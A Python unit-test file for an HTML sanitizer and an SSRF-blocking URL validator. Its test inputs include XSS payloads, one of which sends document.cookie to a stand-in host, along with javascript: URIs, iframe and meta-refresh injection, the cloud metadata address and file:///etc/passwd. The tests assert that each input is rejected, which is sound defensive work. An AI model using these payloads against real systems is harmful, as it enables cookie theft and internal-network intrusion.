import unittest

from backend.app.utils.validation import validate_html_payload
from backend.app.utils.common import validate_public_url, _resolve_public_url


LEGIT_HTML = (
    "<html><head><title>x</title></head><body>"
    "<div style=\"left:1px;top:2px\">Ola &amp; mundo</div>"
    "<img src=\"data:image/png;base64,AAAA\">"
    "<script>const resizePages=()=>{};new ResizeObserver(resizePages);</script>"
    "</body></html>"
)


class HtmlSanitizationTest(unittest.TestCase):
    def test_accepts_legitimate_document(self):
        # HTML tipico gerado pelo conversor: estilos inline, imagem data: e o
        # unico script permitido (resizePages) devem passar.
        self.assertEqual(validate_html_payload(LEGIT_HTML), LEGIT_HTML)

    def test_blocks_inline_event_handlers(self):
        for payload in (
            "<html><body><img src=x onerror=\"steal()\"></body></html>",
            "<html><body onload=\"steal()\">x</body></html>",
            "<html><body><svg><a onclick=\"x\">y</a></svg></body></html>",
        ):
            with self.assertRaises(ValueError):
                validate_html_payload(payload)

    def test_blocks_script_uris(self):
        for payload in (
            "<html><body><a href=\"javascript:alert(1)\">x</a></body></html>",
            "<html><body><a href=\"VBScript:msgbox(1)\">x</a></body></html>",
            "<html><body><object data=\"data:text/html,<script>\"></object></body></html>",
        ):
            with self.assertRaises(ValueError):
                validate_html_payload(payload)

    def test_blocks_dangerous_elements(self):
        for payload in (
            "<html><body><iframe src=\"//e\"></iframe></body></html>",
            "<html><head><link rel=stylesheet href=\"//e/x.css\"></head><body>x</body></html>",
            "<html><head><base href=\"//e/\"></head><body>x</body></html>",
            "<html><head><meta http-equiv=\"refresh\" content=\"0;url=//e\"></head><body>x</body></html>",
        ):
            with self.assertRaises(ValueError):
                validate_html_payload(payload)

    def test_blocks_foreign_script_body(self):
        with self.assertRaises(ValueError):
            validate_html_payload(
                "<html><body><script>fetch('//e/'+document.cookie)</script></body></html>"
            )


class PublicUrlSsrfTest(unittest.TestCase):
    def test_rejects_internal_and_private_targets(self):
        for url in (
            "http://127.0.0.1/x",
            "http://localhost/x",
            "http://169.254.169.254/latest/meta-data",
            "http://10.0.0.1/x",
            "http://192.168.1.1/x",
            "http://[::1]/x",
        ):
            with self.assertRaises(ValueError):
                validate_public_url(url)

    def test_rejects_credentials_and_non_http_schemes(self):
        for url in (
            "http://user:pass@example.com/",
            "ftp://example.com/x",
            "file:///etc/passwd",
        ):
            with self.assertRaises(ValueError):
                validate_public_url(url)

    def test_resolve_returns_ip_and_port_for_public_host(self):
        # Nao faz request de rede: apenas resolucao DNS. O IP devolvido e o que
        # sera fixado na conexao, fechando a janela de DNS rebinding.
        url, ip, port = _resolve_public_url("https://example.com/a.pdf")
        self.assertTrue(url.startswith("https://example.com/"))
        self.assertEqual(port, 443)
        self.assertTrue(ip)


if __name__ == "__main__":
    unittest.main()
